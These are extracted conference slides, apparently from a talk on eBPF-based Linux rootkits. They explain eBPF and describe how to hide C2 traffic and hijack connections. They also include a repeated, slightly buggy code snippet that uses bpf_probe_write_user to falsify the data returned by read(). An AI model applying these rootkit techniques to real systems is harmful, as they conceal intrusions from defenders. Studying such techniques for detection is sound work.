Warping Reality
Creating and countering 
the next generation of 
Linux rootkits using eBPF
Pat Hogan
@PathToFile
Overview
â—
What are Linux kernel rootkits
â—
Why writing and using rootkits is hard
â—
How eBPF solves these problems and more
â—
How to detect and prevent malicious eBPF usage
@pathtoï¬le
What are kernel rootkits?
Kernel Rootkits - Advantages
â—
Attackers want to maintain access to 
compromised machines
â—‹
Credentials change, vulnerabilities get 
patched, etc.
â—
Hooking syscall table = visibility and control
â—‹
See all network traï¬ƒc
â—‹
Hide ï¬les and processes
â—‹
Create root processes
@pathtoï¬le
Kernel Rootkits - Risks
â—
Small bugs can cause major problems
â—‹
Crashing the kernel means crashing the 
system
â—
Any update to the kernel risks disaster
â—
Some environments block arbitrary kernel 
modules (e.g. Amazon EKS)
@pathtoï¬le
â€œHow about we add 
JavaScript-like capabilities to the 
Linux Kernel?â€
- Thomas Graf, Isovalent, 2020
What is eBPF?
eBPF
â—
eBPF (extended Berkeley Packet Filtering)
â—
Experienced rapid growth in last ~2 years
â—
eBPF allows you to create programmable trace 
points in the kernel
â—
Programs can be attached to:
â—‹
Network Interfaces
â—‹
Kernel functions
â—‹
User mode functions
â—
eBPF programs are guaranteed to be:
â—‹
Safe
â—‹
Eï¬ƒcient
â—‹
Portable
@pathtoï¬le
eBPF - Safe and Eï¬ƒcient
â—
Programs typically written in C or Rust
â—
Has variables, loops, conditionals
â—
Can call a small number of helper functions
â—
Compiled by LLVM or GCC into bpf bytecode
â—
Architecture agnostic
â—
Kernel version agnostic
@pathtoï¬le
SEC("tp/syscalls/sys_enter_execve")
int handle_execve_enter(struct trace_event_raw_sys_enter *ctx)
{
    char prog[TASK_COMM_LEN];
    bpf_probe_read_user(&prog, sizeof(prog), ctx->args[0]);
    bpf_printk("Execve: %s", prog);
    return 0;
}
int handle_execve_enter(struct 
trace_event_raw_sys_enter * ctx):
; bpf_probe_read_user(&c, sizeof(c), ctx->args[0]);
   0: (79) r3 = *(u64 *)(r1 +16)
   1: (bf) r6 = r10
   2: (07) r6 += -16
; bpf_probe_read_user(&c, sizeof(c), ctx->args[0]);
   3: (bf) r1 = r6
   4: (b7) r2 = 16
   5: (85) call bpf_probe_read_user#-66336
   6: (b7) r1 = 29477
; bpf_printk("Execve: %s", c);
   7: (6b) *(u16 *)(r10 -24) = r1
   8: (18) r1 = 0x203a657663657845
  10: (7b) *(u64 *)(r10 -32) = r1
  11: (b7) r1 = 0
  12: (73) *(u8 *)(r10 -22) = r1
  13: (bf) r1 = r10
;
  14: (07) r1 += -32
; bpf_printk("Execve: %s", c);
  15: (b7) r2 = 11
  16: (bf) r3 = r6
  17: (85) call bpf_trace_printk#-61248
; return 0;
  18: (b7) r0 = 0
  19: (95) exit
eBPF - Safe and Eï¬ƒcient
â—
Sent to kernel via a user space loader
â—‹
Only CAP_ADMIN or CAP_BPF*
â—
Kernel eBPF Veriï¬er checks code isnâ€™t:
â—‹
Too big 
â—‹
Too complex
â—‹
Reading invalid memory
â—
If code passes, it is compiled to native 
instructions using a JIT compiler
â—‹
Patches locations of helper functions and ï¬elds
â—‹
Enables portability across kernels
â—
Program is then attached to network or function
â—‹
Run once per packer/function call
â—‹
Stateless, but can use Maps to store data
@pathtoï¬le
int main(int argc, char **argv) {
    struct example_bpf *skel;
    int err;
    /* Open BPF application */
    skel = example_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open BPF skeleton\n");
        return 1;
    }
    /* Load & verify BPF programs */
    err = example_bpf__load(skel);
    if (err) {
        fprintf(stderr, "Failed to load and verify BPF skeleton\n");
        goto cleanup;
    }
    /* Attach tracepoint handler */
    err = example_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton\n");
        goto cleanup;
    }
    printf("Successfully started!\n");
    read_trace_pipe();
cleanup:
    example_bpf__destroy(skel);
    return -err;
}
Using eBPF to
Warp Network Reality
eBPF - Warping Network Reality
@pathtoï¬le
eBPF - Warping Network Reality
Security observes:
â—
Connection from internal IP to ssh
â—
No active internet-facing connections
eBPF enables:
â—
Read and write packets pre-ï¬rewall
â—
Routing packets across networks
â—
Altering source and destination
IP and Ports
@pathtoï¬le
ğŸ”¥ğŸ§±
eBPF - Warping Network Reality
Security observes:
â—
Normal web connections
â—
Nothing unusual in netstat or tcpdump
eBPF enables:
â—
Reading C2 packets then discarding
â—
Hijacking existing connections
â—
Cloning packets to create new traï¬ƒc
â—
Can use UProbe to hook OpenSSL 
functions, read and write TLS
@pathtoï¬le
ğŸ”¥ğŸ§±
Using eBPF to
Warp Data Reality
eBPF - Warping Data Reality
@pathtoï¬le
eBPF - Warping Data Reality
@pathtoï¬le
eBPF - Warping Data Reality
@pathtoï¬le
eBPF - Warping Data Reality
@pathtoï¬le
int main() {
    // Open File
    char filename[100] = "read_me";
    int fd = openat(AT_FDCWD, filename, O_RDWR);
    // Read data from file
    char buffer[100];
    read(fd, buffer, sizeof(buffer));
    printf("Data: %s\n", buffer);
    // Close file
    close(fd);
    return 0;
}
SEC("fexit/__x64_sys_read")
int BPF_PROG(read_exit, struct pt_regs *regs, long ret) {
    // 1. Read in data returned from kernel
    char buffer[100];
    bpf_probe_read_user(
&buffer, sizeof(buffer), PT_REGS_PARM2(regs)
    );
    // 2. Change data
    const char *fake_data = "fake_data";
    for (int i=0; i<sizeof(replace); i++) {
        buffer[i] = fake_data[i];
    }
    // 3. Overwrite
    bpf_probe_write_user(
PT_REGS_PARM2(regs), &buffer, sizeof(buffer)
    );
    return 0;
}
User space program
eBPF Program
eBPF - Warping Data Reality
@pathtoï¬le
int main() {
    // Open File
    char filename[100] = "read_me";
    int fd = openat(AT_FDCWD, filename, O_RDWR);
    // Read data from file
    char buffer[100];
    read(fd, buffer, sizeof(buffer));
    printf("Data: %s\n", buffer);
    // Close file
    close(fd);
    return 0;
}
SEC("fexit/__x64_sys_read")
int BPF_PROG(read_exit, struct pt_regs *regs, long ret) {
    // 1. Read in data returned from kernel
    char buffer[100];
    bpf_probe_read_user(
&buffer, sizeof(buffer), PT_REGS_PARM2(regs)
    );
    // 2. Change data
    const char *fake_data = "fake_data";
    for (int i=0; i<sizeof(replace); i++) {
        buffer[i] = fake_data[i];
    }
    // 3. Overwrite
    bpf_probe_write_user(
PT_REGS_PARM2(regs), &buffer, sizeof(buffer)
    );
    return 0;
}
User space program
eBPF Program
eBPF - Warping Data Reality
@pathtoï¬le
int main() {
    // Open File
    char filename[100] = "read_me";
    int fd = openat(AT_FDCWD, filename, O_RDWR);
    // Read data from file
    char buffer[100];
    read(fd, buffer, sizeof(buffer));
    printf("Data: %s\n", buffer);
    // Close file
    close(fd);
    return 0;
}
SEC("fexit/__x64_sys_read")
int BPF_PROG(read_exit, struct pt_regs *regs, long ret) {
    // 1. Read in data returned from kernel
    char buffer[100];
    bpf_probe_read_user(
&buffer, sizeof(buffer), PT_REGS_PARM2(regs)
    );
    // 2. Change data
    const char *fake_data = "fake_data";
    for (int i=0; i<sizeof(replace); i++) {
        buffer[i] = fake_data[i];
    }
    // 3. Overwrite
    bpf_probe_write_user(
PT_REGS_PARM2(regs), &buffer, sizeof(buffer)
    );
    return 0;
}
User space program
eBPF Program